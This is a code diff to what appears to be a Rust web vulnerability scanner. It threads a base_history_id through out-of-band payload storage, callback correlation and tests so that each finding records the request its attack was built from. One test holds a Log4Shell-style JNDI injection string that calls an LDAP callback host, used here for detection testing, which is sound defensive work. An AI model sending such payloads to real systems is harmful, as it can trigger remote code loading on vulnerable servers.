@@ -251,6 +251,8 @@ pub struct ScanPayload<'a> {
     /// The attack's history row, recorded as it went out. Without one, the first finding
     /// it raises records the attack.
     pub history_id: Option<i64>,
+    /// The row of the request the attack was built from (the finding's base_history_id).
+    pub base_history_id: Option<i64>,
     /// Declarative checks: see `checks::interaction_matches`.
     pub check: Option<&'a str>,
 }
@@ -273,8 +275,8 @@ impl Store {
         self.conn.execute(
             "INSERT OR IGNORE INTO oob_payloads
                 (token, source, rule_id, alert_ref, param, attack, other_info, origin, request, response, duration_ms,
-                 history_id, check_json, issued_by)
-             VALUES (?1, 'scan', ?2, ?3, ?4, ?5, ?6, ?7, ?8, ?9, ?10, ?11, ?12, ?13)",
+                 history_id, check_json, issued_by, base_history_id)
+             VALUES (?1, 'scan', ?2, ?3, ?4, ?5, ?6, ?7, ?8, ?9, ?10, ?11, ?12, ?13, ?14)",
             params![
                 p.token,
                 p.rule_id,
@@ -288,7 +290,8 @@ impl Store {
                 p.duration_ms,
                 p.history_id,
                 p.check,
-                crate::provenance::origin()
+                crate::provenance::origin(),
+                p.base_history_id
             ],
         )?;
         Ok(())
@@ -473,12 +476,13 @@ pub fn correlate(store: &mut Store, lookup: impl Fn(&str) -> Option<&'static Ale
             Option<i64>,
             Option<i64>,
             Option<String>,
+            Option<i64>,
         );
         let p: Option<P> = store
             .conn
             .query_row(
                 "SELECT alert_ref, param, attack, other_info, origin, request, response, duration_ms, history_id,
-                        check_json
+                        check_json, base_history_id
                  FROM oob_payloads WHERE token = ?1 AND source = 'scan'",
                 [token],
                 |r| {
@@ -493,11 +497,24 @@ pub fn correlate(store: &mut Store, lookup: impl Fn(&str) -> Option<&'static Ale
                         r.get(7)?,
                         r.get(8)?,
                         r.get(9)?,
+                        r.get(10)?,
                     ))
                 },
             )
             .optional()?;
-        let Some((alert_ref, param, attack, other_info, origin, request, response, duration_ms, history_id, check)) = p
+        let Some((
+            alert_ref,
+            param,
+            attack,
+            other_info,
+            origin,
+            request,
+            response,
+            duration_ms,
+            history_id,
+            check,
+            base,
+        )) = p
         else {
             continue;
         };
@@ -537,7 +554,7 @@ pub fn correlate(store: &mut Store, lookup: impl Fn(&str) -> Option<&'static Ale
         // No evidence (like ZAP's OAST alerts): repeated callbacks for the same
         // parameter, from any payload or protocol, count as hits of one finding.
         let finding = def.raise(param, "").attack(attack).other_info(info);
-        out.new_findings += store.record_findings("active", &msg, std::slice::from_ref(&finding))?;
+        out.new_findings += store.record_findings_from("active", &msg, std::slice::from_ref(&finding), base)?;
         out.matched += 1;
         out.raised.push(alert_ref);
     }
@@ -627,6 +644,7 @@ mod tests {
                 response: Some(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n"),
                 duration_ms: Some(3),
                 history_id: None,
+                base_history_id: None,
                 check: None,
             })
             .unwrap();
@@ -684,6 +702,16 @@ mod tests {
         let tok = new_token().unwrap();
         let req = format!("GET /?q=${{jndi:ldap://{tok}.oob.test/a}} HTTP/1.1\r\nHost: app.test\r\n\r\n");
         let resp: &[u8] = b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n";
+        let base = store
+            .record(&Capture::new(
+                "proxy",
+                &target,
+                b"GET /?q=a HTTP/1.1\r\nHost: app.test\r\n\r\n",
+                Some(resp),
+                Some(3),
+                None,
+            ))
+            .unwrap();
         let row = store.record(&Capture::new("scan", &target, req.as_bytes(), Some(resp), Some(3), None)).unwrap();
         store
             .oob_add_scan_payload(&ScanPayload {
@@ -698,6 +726,7 @@ mod tests {
                 response: Some(resp),
                 duration_ms: Some(3),
                 history_id: Some(row),
+                base_history_id: Some(base),
                 check: None,
             })
             .unwrap();
@@ -706,8 +735,12 @@ mod tests {
         let c = correlate(&mut store, |r| (r == "40043-1").then_some(&DEF)).unwrap();
         assert_eq!(c.new_findings, 1, "{c:?}");
         assert_eq!(store.max_history_id().unwrap(), row);
-        let f = store.query("SELECT history_id FROM findings WHERE alert_ref = '40043-1'", &[], 10, 100).unwrap();
+        let f = store
+            .query("SELECT history_id, base_history_id FROM findings WHERE alert_ref = '40043-1'", &[], 10, 100)
+            .unwrap();
         assert_eq!(f.rows[0][0], row);
+        // The request the attack was built from goes with it, for `findings verify`.
+        assert_eq!(f.rows[0][1], base);
     }
 
     #[test]
@@ -754,6 +787,7 @@ mod tests {
                 response: None,
                 duration_ms: None,
                 history_id: None,
+                base_history_id: None,
                 check: Some(&check),
             })
             .unwrap();
